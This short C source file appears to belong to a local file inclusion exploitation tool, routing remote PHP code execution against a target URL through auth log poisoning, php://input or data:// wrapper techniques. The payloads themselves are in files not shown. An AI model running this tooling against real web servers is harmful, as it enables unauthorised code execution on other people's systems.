#include "fun/exec-php-code.h"
#include "techniques/rce.h"
#include "output.h"

void exec_code(const char *url, const char *parameter, const char *code, int technique)
{
	xinfo("trying exec code ...\n");
	char *rce = exec_php_code(url, parameter, code, technique);

	xinfo("result:\n");
	if (rce) {
		printf("%s\n", rce);
		free(rce);
	} else {
		xerror("nothing to show!\n");
	}
}

char *exec_php_code(const char *url, const char *parameter, const char *code, int technique)
{
	char *rce = NULL;

	switch (technique) {
		case auth_log_tech:
			rce = auth_log_rce(url, code);
			break;
		case php_input_tech:
			rce = php_input_rce(url, code);
			break;
		case datawrap_tech:
			rce = data_wrap_rce(url, parameter, code);
			break;
	}

	return rce;
}
